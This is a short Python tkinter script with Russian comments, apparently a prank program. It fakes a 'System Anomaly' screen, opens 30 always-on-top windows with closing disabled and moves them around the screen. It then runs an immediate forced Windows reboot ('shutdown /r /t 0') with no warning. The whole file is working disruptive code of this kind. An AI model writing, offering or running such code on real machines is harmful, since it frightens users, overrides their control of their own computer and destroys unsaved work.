import tkinter as tk
import random
import threading
import time
import os

root = tk.Tk()
root.attributes("-fullscreen", True)
root.configure(bg="black")
root.title("System Anomaly")

canvas = tk.Canvas(root, bg="black", highlightthickness=0)
canvas.pack(fill="both", expand=True)

# Центральная точка
center_dot = canvas.create_oval(
    root.winfo_screenwidth() // 2 - 10,
    root.winfo_screenheight() // 2 - 10,
    root.winfo_screenwidth() // 2 + 10,
    root.winfo_screenheight() // 2 + 10,
    fill="white", outline="")

windows = []

def move_windows():
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    while windows:
        for win in windows:
            try:
                x = random.randint(0, screen_width - 300)
                y = random.randint(0, screen_height - 200)
                win.geometry(f"300x200+{x}+{y}")
            except tk.TclError:
                pass
        time.sleep(1)

def open_many_windows():
    for _ in range(30):
        win = tk.Toplevel()
        win.attributes("-topmost", True)
        win.geometry("300x200+0+0")
        win.configure(bg="black")

        dot = tk.Canvas(win, width=10, height=10, bg="black", highlightthickness=0)
        dot.place(relx=0.5, rely=0.5, anchor="center")
        dot.create_oval(0, 0, 10, 10, fill="red", outline="")

        win.protocol("WM_DELETE_WINDOW", lambda: None)  # Блокируем закрытие вручную
        windows.append(win)

    threading.Thread(target=move_windows, daemon=True).start()

def close_all_windows():
    for win in windows:
        try:
            win.destroy()
        except:
            pass
    windows.clear()

def blink_and_shutdown():
    for _ in range(5):
        canvas.itemconfig(center_dot, fill="black")
        root.update()
        time.sleep(0.3)
        canvas.itemconfig(center_dot, fill="red")
        root.update()
        time.sleep(0.3)
    canvas.delete(center_dot)
    root.update()
    time.sleep(1)
    os.system("shutdown /r /t 0")

def sequence():
    time.sleep(10)
    canvas.itemconfig(center_dot, fill="red")
    open_many_windows()

    time.sleep(7)  # Через 7 секунд начинаем закрытие окон
    close_all_windows()

    time.sleep(3)  # Оставшиеся 3 секунды до конца
    blink_and_shutdown()

threading.Thread(target=sequence, daemon=True).start()

root.bind("<Escape>", lambda e: root.destroy())
root.mainloop()